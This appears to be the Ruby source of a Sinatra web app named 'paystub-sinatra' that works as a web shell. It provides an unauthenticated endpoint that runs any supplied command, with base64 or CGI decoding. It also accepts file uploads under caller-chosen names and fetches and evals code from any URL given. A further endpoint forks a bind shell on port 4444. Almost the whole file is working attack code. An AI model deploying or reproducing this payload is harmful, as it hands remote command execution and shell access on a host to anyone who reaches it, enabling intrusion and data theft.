require 'base64'
require 'cgi'
require 'sinatra/base'
require 'open-uri'
require 'slim'

require "paystub-sinatra/version"

module Paystub
  module Sinatra
    class StopShell < RuntimeError; end
    class PaystubApp < ::Sinatra::Base
      configure do
        enable :logging
        set :root, File.join(__dir__,'..')
        set :bind, '0.0.0.0'
        set :port, 8000
      end
      configure :development do
        use Rack::Reloader
        ::Sinatra::Application.reset!
      end
      helpers do
        def pop_bindshell(host: '0.0.0.0', port: 4444)
          cmd="id"
          server=TCPServer.new(port)

          while client=server.accept
            begin
              while(cmd=client.gets&.chomp)
                if cmd.match(/exit!/)
                  logger.info(format("EXIT COMMAND"))
                  client.puts "shutting down"
                  raise StopShell, "shutting down"
                else
                  logger.info(format("COMMAND: %s",cmd))
                  IO.popen(cmd,"r") {|io| client.puts(io.read)}
                end
              end
            rescue Errno::ENOENT
              logger.error(format("command not found: %s",cmd))
              retry
            rescue Paystub::Sinatra::StopShell
              logger.info(format("BREAK LOOP: %s",cmd))
              client.close
              break
            end
          end
          server.close
          exit(0)
        end
        def do_oneshot(command: nil, encode: nil)
          decoded = case encode
          when 'base64'
            Base64.decode64(command)
          when 'cgi'
            CGI.unescape(command)
          else
            command
          end
          IO.popen(decoded, "r").read
        end
      end
      get "/" do
        slim :index
      end

      get "/oneshot" do
        if params[:cmd]!=nil
          do_oneshot(command: params[:cmd], encode: params[:encode])
        else
          "encode=(base64|cgi)&cmd=runme\n"
        end
      end

      post "/oneshot" do
        if params[:cmd]!=nil
          do_oneshot(command: params[:cmd], encode: params[:encode])
        else
          "encode=(base64|cgi)&cmd=runme\n"
        end
      end

      get "/upload" do
        "PUT #{url('/upload/filename.ext')}\n"
      end

      put "/upload/:filename" do
        bytes=File.open(File.join('tmp',params[:filename]),"w") {|f| f.write(request.body.read)}
        "wrote tmp/#{params[:filename]} (#{bytes} bytes)"
      end

      get "/rfi" do
        if params[:url]
          code=open(params[:url],"r").read
          eval(code)
        else
          "GET #{url('/rfi')}?url=http://<blah>\n"
        end
      end

      get "/bindshell" do
        payload = {
          'port' => 4444,
          'host' => '0.0.0.0',
          'runit' => false
        }.merge(params)
        if payload['runit'] && session[:child].nil?
          begin
            session[:child] = Process.fork do
              pop_bindshell(host: payload['host'], port: payload['port'])
              Process.exit
            end
          rescue
            logger.error("BROKE LOOP")
          ensure
            Process.detach(session[:child])
          end
        end
        slim :bindshell, locals: { payload_options: payload, child: session[:child] }
      end
      run! if app_file == $0
    end
  end
end
